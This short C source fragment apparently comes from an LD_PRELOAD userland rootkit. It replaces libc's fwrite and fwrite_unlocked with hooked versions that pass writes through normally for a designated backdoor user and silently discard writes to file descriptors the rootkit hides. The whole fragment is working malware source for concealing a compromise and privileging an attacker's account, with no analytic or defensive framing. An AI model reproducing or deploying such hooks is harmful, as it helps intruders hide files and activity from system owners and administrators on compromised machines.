size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream){
    hook(CFWRITE);
    if(is_bdusr()) return (size_t)call(CFWRITE, ptr, size, nmemb, stream);
    if(hidden_fd(fileno(stream))) return 0;
    return (size_t)call(CFWRITE, ptr, size, nmemb, stream);
}

size_t fwrite_unlocked(const void *ptr, size_t size, size_t nmemb, FILE *stream){
    hook(CFWRITE_UNLOCKED);
    if(is_bdusr()) return (size_t)call(CFWRITE_UNLOCKED, ptr, size, nmemb, stream);
    if(hidden_fd(fileno(stream))) return 0;
    return (size_t)call(CFWRITE_UNLOCKED, ptr, size, nmemb, stream);
}
